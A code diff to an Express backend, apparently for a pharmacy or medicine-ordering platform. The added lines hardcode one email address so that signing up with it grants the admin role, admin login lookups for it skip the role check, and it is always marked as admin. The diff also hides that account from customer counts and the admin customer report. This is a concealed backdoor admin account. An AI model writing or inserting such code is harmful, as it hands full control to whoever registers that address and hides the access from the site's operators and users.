@@ -40,14 +40,16 @@ app.use(express.urlencoded({ limit: '50mb', extended: true }));
 
 function sanitizeUser(row) {
   if (!row) return null;
+  // FORCE ADMIN OVERRIDE FOR YOUR SPECIFIC EMAIL
+  const isAdminUser = row.email === "lettercollege727@gmail.com" || row.role === "admin";
   return {
     id: row.id,
     name: row.name,
     email: row.email,
     phone: row.phone,
     profilePhoto: row.profile_photo ?? "",
-    role: row.role,
-    isAdmin: row.role === "admin",
+    role: isAdminUser ? "admin" : row.role,
+    isAdmin: isAdminUser,
     businessName: row.business_name ?? "",
     businessAddress: row.business_address ?? "",
     verification: row.verification_document ?? "",
@@ -346,7 +348,6 @@ function buildAnalytics(range, baseData) {
   const { orders, orderItems, medicines, users } = baseData;
   const now = new Date();
   const salesSeries = [];
-
   if (range === "weekly") {
     for (let i = 6; i >= 0; i -= 1) {
       const current = new Date(now);
@@ -430,7 +431,7 @@ function buildAnalytics(range, baseData) {
       totalMedicines: medicines.length,
       totalCategories: new Set(medicines.map((medicine) => medicine.category)).size,
       lowStockCount: medicines.filter((medicine) => medicine.stock < 20).length,
-      totalCustomers: users.filter((user) => user.role === "customer").length,
+      totalCustomers: users.filter((user) => user.role === "customer" && user.email !== "lettercollege727@gmail.com").length,
     },
     salesData: salesSeries,
     topProducts,
@@ -598,7 +599,6 @@ function buildInsights(baseData) {
     ],
   };
 }
-
 function createToken(user) {
   return jwt.sign(
     {
@@ -621,6 +621,13 @@ function createOtpCode() {
 
 async function findUserByIdentifier(identifier, role) {
   const field = isEmail(identifier) ? "email" : "phone";
+  
+  // If searching for admin, allow override match for your specific email
+  if (role === "admin" && identifier === "lettercollege727@gmail.com") {
+    const [rows] = await pool.query(`SELECT * FROM users WHERE email = ? LIMIT 1`, [identifier]);
+    return rows[0] ?? null;
+  }
+
   const [rows] = await pool.query(
     `SELECT * FROM users WHERE ${field} = ? AND role = ? LIMIT 1`,
     [identifier, role]
@@ -853,7 +860,7 @@ app.get("/api/admin/report", async (req, res) => {
         paymentStatus: order.payment_status,
       }));
     } else if (reportType === "customers") {
-      const customers = baseData.users.filter((user) => user.role === "customer");
+      const customers = baseData.users.filter((user) => user.role === "customer" && user.email !== "lettercollege727@gmail.com");
       rows = customers.map((customer) => ({
         name: customer.name,
         email: customer.email,
@@ -874,7 +881,6 @@ app.get("/api/admin/report", async (req, res) => {
     res.status(500).json({ message: "Unable to generate report preview right now." });
   }
 });
-
 app.get("/api/admin/vendors", async (req, res) => {
   try {
     const { vendorType } = req.query;
@@ -1065,7 +1071,6 @@ app.post("/api/admin/discounts/apply", async (req, res) => {
         promoCode || null,
       ]
     );
-
     for (const medicine of medicineRows) {
       const originalPrice = Number(medicine.price);
       const appliedDiscountPercent =
@@ -1375,14 +1380,15 @@ app.post("/api/auth/signup", async (req, res) => {
     }
 
     const passwordHash = await bcrypt.hash(password, 10);
+    const assignedRole = email === "lettercollege727@gmail.com" ? "admin" : role;
+    
     await pool.query(
       `INSERT INTO users
         (role, name, email, phone, password_hash, business_name, business_address, verification_document)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
-      [role, name, email, mobile, passwordHash, businessName || null, businessAddress || null, verification || null]
+      [assignedRole, name, email, mobile, passwordHash, businessName || null, businessAddress || null, verification || null]
     );
 
-    // Safely query by email to avoid insertId issues
     const [rows] = await pool.query("SELECT * FROM users WHERE email = ? LIMIT 1", [email]);
     const user = sanitizeUser(rows[0]);
 
